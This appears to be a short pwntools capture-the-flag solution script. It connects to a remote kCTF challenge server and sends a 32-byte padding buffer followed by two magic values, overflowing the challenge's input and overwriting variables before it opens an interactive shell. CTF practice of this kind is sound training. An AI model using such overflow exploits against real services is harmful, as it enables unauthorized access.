from pwn import *

# Set up connection to the remote server
host = "p0wn3d2.kctf-453514-codelab.kctf.cloud"
port = 1337

# Create a remote connection
p = remote(host, port)

elf = context.binary = ELF('./chal')

# p = process()
# p = gdb.debug('./chal', '''
# b *main+97
# continue
# ''')

p.recvuntil('yourself?')
payload = b'B'*(32)
payload += p32(0xdeadbeef)
payload += p32(0x0badc0de)


p.sendline(payload)

p.interactive()